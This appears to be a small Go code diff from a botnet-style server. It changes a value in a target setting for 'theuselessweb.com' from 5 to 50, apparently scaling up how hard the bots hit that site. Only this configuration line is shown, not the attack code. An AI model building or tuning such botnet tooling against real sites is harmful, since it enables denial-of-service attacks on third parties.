@@ -38,7 +38,7 @@ type ChangeTargetReqBody struct {
 	Target string `json:"target"`
 }
 
-var targetInfo = TargetInfo{"https://theuselessweb.com/", 5}
+var targetInfo = TargetInfo{"https://theuselessweb.com/", 50}
 var botnetServer = BotnetServer{true, make(map[string]time.Time), []BotStats{}}
 var PORT = 3000
 
